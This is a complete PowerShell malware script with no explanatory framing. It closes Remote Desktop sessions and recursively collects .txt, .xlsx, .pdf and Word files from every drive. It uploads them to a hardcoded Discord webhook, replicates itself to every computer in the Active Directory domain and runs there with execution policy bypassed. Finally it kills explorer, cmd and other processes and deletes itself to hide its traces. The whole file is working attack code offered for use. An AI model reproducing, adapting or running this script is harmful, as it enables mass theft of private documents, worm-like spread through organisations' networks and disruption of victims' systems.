# Function to close any active Remote Desktop connections
function Close-RemoteDesktopConnections {
    $rdpProcesses = Get-Process -Name mstsc -ErrorAction SilentlyContinue
    foreach ($process in $rdpProcesses) {
        Stop-Process -Id $process.Id -Force
    }
}

# Function to upload file to Discord webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath,
        [string]$webhookUrl
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

    # Create multipart/form-data content
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        "",
        [System.Convert]::ToBase64String($fileBytes),
        "--$boundary--"
    )
    $body = $bodyLines -join $LF
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)

    # Send the request
    $webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
    $webRequest.Method = "POST"
    $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
    $webRequest.ContentLength = $bytes.Length
    $webRequestStream = $webRequest.GetRequestStream()
    $webRequestStream.Write($bytes, 0, $bytes.Length)
    $webRequestStream.Close()

    # Get the response from the server
    $webResponse = $webRequest.GetResponse()
    $webResponseStream = $webResponse.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($webResponseStream)
    $responseContent = $reader.ReadToEnd()
    $reader.Close()
    $webResponseStream.Close()
    $webResponse.Close()
}

# Function to get files by extension in rotation
function Get-FilesInRotation {
    param (
        [string]$rootPath,
        [array]$extensions
    )

    $files = @()
    foreach ($extension in $extensions) {
        $files += Get-ChildItem -Path $rootPath -Filter "*.$extension" -Recurse -ErrorAction SilentlyContinue
    }
    return $files
}

# Function to replicate the script to other computers and execute it
function Replicate-Script {
    param (
        [string]$scriptPath,
        [string]$webhookUrl
    )

    # Get all computers in the domain
    $computers = Get-ADComputer -Filter * | Select-Object -ExpandProperty Name
    foreach ($computer in $computers) {
        try {
            # Copy the script to the target computer
            Copy-Item -Path $scriptPath -Destination "\\$computer\C$\Windows\Temp\" -Force -ErrorAction Stop

            # Execute the script on the target computer
            Invoke-Command -ComputerName $computer -ScriptBlock {
                param ($scriptPath, $webhookUrl)
                powershell.exe -ExecutionPolicy Bypass -File $scriptPath
            } -ArgumentList "\\$computer\C$\Windows\Temp\upload_to_discord.ps1", $webhookUrl -Credential (Get-Credential) -ErrorAction Stop
        } catch {
            Write-Host "Failed to replicate or execute on $computer: $_"
            continue
        }
    }
}

# Function to close all windows
function Close-AllWindows {
    Stop-Process -Name powershell -Force
    Stop-Process -Name notepad -Force
    Stop-Process -Name explorer -Force
    Stop-Process -Name cmd -Force
}

# Close any active Remote Desktop connections
Close-RemoteDesktopConnections

# Recursively get all .txt, .xlsx, .pdf, .doc, .docx files from all drives in rotation
$webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
$extensions = @("txt", "xlsx", "pdf", "doc", "docx")
$drives = Get-PSDrive -PSProvider FileSystem

$startTime = Get-Date
foreach ($drive in $drives) {
    $files = Get-FilesInRotation -rootPath $drive.Root -extensions $extensions
    foreach ($file in $files) {
        $currentTime = Get-Date
        if (($currentTime - $startTime).TotalSeconds -gt 20) {
            break
        }
        Upload-FileToDiscord -filePath $file.FullName -webhookUrl $webhookUrl
    }
}

# Replicate the script to other computers
Replicate-Script -scriptPath $MyInvocation.MyCommand.Definition -webhookUrl $webhookUrl

# Close all windows and stop the script after 20 seconds
Start-Sleep -Seconds 20
Close-AllWindows

# Remove the PowerShell script file after execution
$scriptPath = $MyInvocation.MyCommand.Definition
Remove-Item -Path $scriptPath -Force
